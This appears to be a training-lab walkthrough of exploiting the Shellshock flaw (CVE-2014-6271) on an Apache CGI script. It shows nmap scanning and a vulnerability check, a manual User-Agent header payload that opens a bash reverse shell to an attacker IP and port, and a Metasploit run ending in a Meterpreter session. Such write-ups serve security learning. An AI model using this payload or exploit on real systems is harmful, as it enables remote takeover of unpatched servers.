Allow the attacker to do RCE
# 1. Check port 80
We can see that an Apache 2.4.6 is running.

```bash
$> nmap -sV 192.208.74.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 17:52 IST
Nmap scan report for demo.ine.local (192.208.74.3)
Host is up (0.000025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
MAC Address: 02:42:C0:D0:4A:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds
```
# 2. Check shellshock vuln
First we have to find a .cgi file in the server.
Once you find the .cgi file you can check by doing the command:

```bash
$> nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"  192.208.74.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 18:09 IST
Nmap scan report for demo.ine.local (192.208.74.3)
Host is up (0.000025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://seclists.org/oss-sec/2014/q3/685
|_http-server-header: Apache/2.4.6 (Unix)
MAC Address: 02:42:C0:D0:4A:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
```
# 3. Exploit - Manually
In burp suite, change the user agent of the request:

![[Pasted image 20241025144605.png]]

You can change the command to:
```bash
() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<IP>/<PORT> 0>&1'
```
# 3. Exploit - Metasploit
Use the module `auxiliary/scanner/http/apache_mod_cgi_bash_env`
```bash
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /gettime.cgi
TARGETURI => /gettime.cgi
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 192.208.74.2:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 192.208.74.3
[*] Meterpreter session 1 opened (192.208.74.2:4444 -> 192.208.74.3:33208) at 2024-10-25 18:26:01 +0530

meterpreter > 
```